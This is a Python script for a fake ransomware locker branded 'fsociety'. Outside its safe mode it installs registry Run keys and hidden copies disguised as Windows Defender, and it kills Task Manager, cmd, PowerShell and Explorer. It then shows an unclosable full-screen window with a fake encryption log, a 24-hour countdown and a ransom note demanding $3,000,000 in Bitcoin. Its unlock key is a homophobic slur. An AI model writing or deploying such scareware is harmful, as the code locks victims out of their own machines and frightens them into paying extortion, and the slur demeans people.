import sys
import subprocess
import os
import threading
import time
import shutil
import tkinter as tk
from tkinter import font as tkfont
import atexit
import random
import string
import tempfile

# ==========================================
# FSOCIETY SYSTEM LOCKDOWN - ADVANCED EDITION
# ==========================================

# SAFE MODE - SET TO True FOR TESTING
SAFE_MODE = True

# --- ADVANCED PERSISTENCE ---
def install_advanced_persistence():
    if SAFE_MODE:
        return
    
    try:
        current_path = os.path.abspath(__file__)
        hidden_locations = [
            os.path.join(os.getenv('WINDIR'), "System32", "Tasks", "Microsoft", "Windows", "Defender", "Scan"),
            os.path.join(os.getenv('PROGRAMDATA'), "Microsoft", "Windows Defender", "Platform", "4.18.23110"),
        ]
        
        for location in hidden_locations[:2]:
            try:
                os.makedirs(os.path.dirname(location), exist_ok=True)
                shutil.copy2(current_path, location)
                subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
            except:
                pass
        
        registry_entries = [
            (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsDefenderUpdate"),
            (r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "SystemHealthCheck"),
        ]
        
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        
        for reg_path, value_name in registry_entries:
            try:
                reg_cmd = f'reg add "{reg_path}" /v "{value_name}" /t REG_SZ /d "{pythonw_path} \"{current_path}\"" /f'
                subprocess.run(reg_cmd, shell=True, capture_output=True)
            except:
                pass
        
    except Exception as e:
        pass

def terminate_all_apps():
    processes_to_kill = [
        "taskmgr.exe", "cmd.exe", "powershell.exe", "powershell_ise.exe",
        "regedit.exe", "msconfig.exe", "explorer.exe",
    ]
    
    terminated = []
    
    if SAFE_MODE:
        return ["taskmgr.exe", "cmd.exe", "powershell.exe", "explorer.exe", 
                "chrome.exe", "firefox.exe", "regedit.exe"]
    
    try:
        for process in processes_to_kill[:8]:
            try:
                result = subprocess.run(
                    f'taskkill /F /IM {process}',
                    shell=True,
                    capture_output=True,
                    timeout=1
                )
                if result.returncode == 0:
                    terminated.append(process)
            except:
                pass
        
        try:
            subprocess.run('taskkill /F /IM explorer.exe', shell=True, capture_output=True)
            if "explorer.exe" not in terminated:
                terminated.append("explorer.exe")
        except:
            pass
            
    except Exception as e:
        pass
    
    return terminated

def scan_files_continuously(file_display, root):
    scan_folders = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Pictures"),
        os.path.expanduser("~\\Music"),
        os.path.expanduser("~\\Videos"),
        os.path.expanduser("~\\OneDrive"),
        "C:\\Users\\Public\\Documents",
        "C:\\Users\\Public\\Desktop",
        "C:\\Users\\Public\\Downloads",
    ]
    
    while root.winfo_exists():
        try:
            folder = random.choice(scan_folders)
            if not os.path.exists(folder):
                continue
            
            file_types = [
                "financial_report", "tax_documents", "business_plan", "client_data",
                "passwords", "family_photos", "backup_files", "source_code",
                "database_backup", "encryption_keys", "wallet_info", "config_files",
                "employee_records", "bank_statements", "contracts", "research_data"
            ]
            
            extensions = [".xlsx", ".pdf", ".docx", ".zip", ".rar", ".7z", ".pem", ".key", ".txt", ".jpg", ".png"]
            
            file_name = random.choice(file_types) + "_" + str(random.randint(2020, 2024)) + random.choice(extensions)
            
            if random.random() > 0.5:
                subfolders = ["Work", "Personal", "Important", "Backup", "Projects", "Financial"]
                subfolder = random.choice(subfolders)
                full_path = f"{folder}\\{subfolder}\\{file_name}"
            else:
                full_path = f"{folder}\\{file_name}"
            
            file_display.insert(tk.END, f"ENCRYPTING >> {full_path}\n")
            file_display.see(tk.END)
            
            time.sleep(0.06)
            
        except:
            time.sleep(0.1)

# --- MAIN GUI ---
def create_gui():
    install_advanced_persistence()
    terminated_apps = terminate_all_apps()
    
    root = tk.Tk()
    root.title("SYSTEM_CORE_LOCK")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    def check_key(event=None):
        entered_key = key_entry.get()
        if entered_key == "jaronisgay":
            if not SAFE_MODE:
                try:
                    registry_entries = [
                        (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsDefenderUpdate"),
                        (r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "SystemHealthCheck"),
                    ]
                    
                    for reg_path, value_name in registry_entries:
                        cmd = f'reg delete "{reg_path}" /v "{value_name}" /f'
                        subprocess.run(cmd, shell=True, capture_output=True)
                    
                    subprocess.run('schtasks /delete /tn "Microsoft\\Windows\\Defender\\DefenderUpdate" /f', 
                                  shell=True, capture_output=True)
                except:
                    pass
            
            if not SAFE_MODE:
                try:
                    subprocess.run('start explorer.exe', shell=True, capture_output=True)
                except:
                    pass
            
            root.attributes('-topmost', False)
            root.destroy()
            
        else:
            key_entry.delete(0, tk.END)
            key_entry.insert(0, "ACCESS DENIED")
            root.after(500, lambda: key_entry.delete(0, tk.END))
    
    def force_focus():
        if root.winfo_exists():
            root.attributes('-topmost', True)
            if root.focus_get() != key_entry:
                key_entry.focus_force()
            root.after(100, force_focus)
    
    # --- LEFT SIDEBAR (WIDER - 500px) ---
    sidebar = tk.Frame(root, width=500, bg='black', highlightbackground="red", highlightthickness=2)
    sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=20, pady=20)
    
    clown_image = None
    try:
        possible_paths = [
            "clown.png",
            os.path.join(os.path.dirname(__file__), "clown.png"),
            os.path.join(os.path.expanduser("~"), "Desktop", "clown.png"),
        ]
        
        clown_path = None
        for path in possible_paths:
            if os.path.exists(path):
                clown_path = path
                break
        
        if clown_path:
            from PIL import Image, ImageTk
            pil_img = Image.open(clown_path)
            pil_img = pil_img.resize((450, 230))
            clown_image = ImageTk.PhotoImage(pil_img)
            clown_label = tk.Label(sidebar, image=clown_image, bg='black')
            clown_label.image = clown_image
            clown_label.pack(pady=(40, 20))
        else:
            tk.Label(sidebar, text="[FSOCIETY LOGO]", 
                    font=("Courier", 22, "bold"), fg="red", bg="black").pack(pady=40)
    except Exception as e:
        tk.Label(sidebar, text="[FSOCIETY]", 
                font=("Courier", 28, "bold"), fg="red", bg="black").pack(pady=40)
    
    # CHANGED: "WE ARE FSOCIETY"
    tk.Label(sidebar, text="WE ARE FSOCIETY", 
            font=("Courier", 18, "bold"), bg='black', fg='red').pack(pady=10)
    
    # File scanning display
    scan_frame = tk.Frame(sidebar, bg='black', highlightbackground="red", highlightthickness=2)
    scan_frame.pack(fill=tk.BOTH, expand=True, pady=15)
    
    file_display = tk.Text(scan_frame, font=("Courier", 9), bg='black', fg='red', 
                          borderwidth=0, wrap='none')
    file_display.pack(fill=tk.BOTH, expand=True)
    
    # Add scrollbar
    scrollbar = tk.Scrollbar(file_display)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    file_display.config(yscrollcommand=scrollbar.set)
    scrollbar.config(command=file_display.yview)
    
    # Simple status display
    file_display.insert(tk.END, "[STATUS]\n")
    file_display.insert(tk.END, "════════════════════════════════\n")
    file_display.insert(tk.END, "[✓] Lockdown Active\n")
    file_display.insert(tk.END, "[✓] Advanced Persistence\n")
    file_display.insert(tk.END, "[✓] Timer: ARMED\n\n")
    
    file_display.insert(tk.END, "[TERMINATED]\n")
    file_display.insert(tk.END, "════════════════════════════════\n")
    for app in terminated_apps[:12]:
        file_display.insert(tk.END, f"● {app}\n")
    
    if len(terminated_apps) > 12:
        file_display.insert(tk.END, f"... {len(terminated_apps) - 12} more\n")
    
    file_display.insert(tk.END, "\n")
    file_display.insert(tk.END, "[ENCRYPTION LOG]\n")
    file_display.insert(tk.END, "════════════════════════════════\n")
    
    # --- MAIN AREA ---
    main_outline = tk.Frame(root, bg='black', highlightbackground="red", highlightthickness=4, bd=0)
    main_outline.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=25, pady=25)
    
    # Title
    tk.Label(main_outline, text="-" * 100, 
            font=("Courier", 16), bg='black', fg='red').pack(pady=(20, 0))
    tk.Label(main_outline, text="S Y S T E M   L O C K D O W N", 
            font=("Courier", 35, "bold"), bg='black', fg='red').pack()
    tk.Label(main_outline, text="-" * 100, 
            font=("Courier", 16), bg='black', fg='red').pack(pady=(0, 20))
    
    # Ransom message - SMALLER FONT (13) for more text
    editable_warning = tk.Text(main_outline, font=("Courier", 13), bg='black', fg='red',
                              borderwidth=0, highlightthickness=0, wrap=tk.WORD, height=25)
    editable_warning.pack(fill=tk.BOTH, expand=True, padx=20)
    editable_warning.tag_configure("center", justify='center')
    
    fsociety_msg = (
        "Oooops! your computer is now under the control of FSOCIETY collective. "
        "All data has now been encrypted using an unbreakable AE3-256 + SSA-4096 "
        "multi-layer cipher. Without the private key store on our offshore servers "
        "your files will be permanently inaccessible.\n\n"
        
        "----------------------------------- W H A T H A P P E N E D ---------------------------\n\n"
        "All personal and work files are LOCKED\n"
        "Backups have been destroyed\n"
        "Recovery tools have been disabled\n"
        "Security processes have been terminated\n"
        "Advanced persistence installed (hard to remove)\n\n"
        
        "----------------------------------- W A R N I N G -------------------------------------\n\n"
        "Any attempts to modify, recover, or remove this application will result "
        "in PERMANENT DESTRUCTION of your decryption key\n\n"
        
        "----------------------------------- P A Y M E N T -------------------------------------\n\n"
        "Amount: $3,000,000 USD (Bitcoin ONLY)\n"
        "Wallet: 1Fsociety84ck3s9wnEverything99999999\n"
        "Email:  fsociety@protonmail.com\n\n"
        
        "----------------------------------- D E A D L I N E -----------------------------------\n\n"
        "24 HOURS from infection. Timer shows your remaining time.\n"
        "When it reaches 00:00:00 - key will be erased forever.\n\n"
        "---------------------------------------------------------------------------------------"
    )
    
    editable_warning.insert(tk.END, fsociety_msg)
    editable_warning.tag_add("center", "1.0", "end")
    
    # --- BOTTOM RIGHT: KEY BOX & TIMER ---
    br_frame = tk.Frame(main_outline, bg='black')
    br_frame.place(relx=1.0, rely=1.0, anchor='se', x=-10, y=-10)
    
    tk.Label(br_frame, text="-" * 35, font=("Courier", 10), bg='black', fg='red').pack()
    tk.Label(br_frame, text="ENTER ACCESS KEY:", font=("Courier", 12, "bold"), bg='black', fg='red').pack()
    
    key_entry = tk.Entry(br_frame, font=("Courier", 14), bg='black', fg='red', 
                        insertbackground='red', highlightthickness=1, highlightbackground="red", width=25)
    key_entry.pack(pady=5)
    key_entry.bind("<Return>", check_key)
    
    tk.Label(br_frame, text="-" * 25, font=("Courier", 10), bg='black', fg='red').pack(pady=(0, 5))
    
    timer_label = tk.Label(br_frame, text="24:00:00", font=("Courier", 28, "bold"), bg='black', fg='red')
    timer_label.pack()
    
    def update_timer(seconds):
        if not root.winfo_exists(): 
            return
        if seconds <= 0:
            timer_label.config(text="00:00:00")
            file_display.insert(tk.END, "\n[SYSTEM] Decryption keys destroyed\n")
            file_display.see(tk.END)
            return
        
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        secs = seconds % 60
        
        timer_label.config(text=f"{hours:02d}:{minutes:02d}:{secs:02d}")
        
        if hours == 0:
            if minutes < 30:
                timer_label.config(fg="orange")
            if minutes < 5:
                timer_label.config(fg="dark orange")
        
        root.after(1000, lambda: update_timer(seconds - 1))
    
    update_timer(86400)
    force_focus()
    threading.Thread(target=scan_files_continuously, args=(file_display, root), daemon=True).start()
    key_entry.focus_set()
    root.mainloop()

def cleanup():
    pass

if __name__ == "__main__":
    print("=" * 60)
    print("FSOCIETY SYSTEM LOCKDOWN")
    print("=" * 60)
    
    atexit.register(cleanup)
    
    try:
        create_gui()
    except Exception as e:
        cleanup()
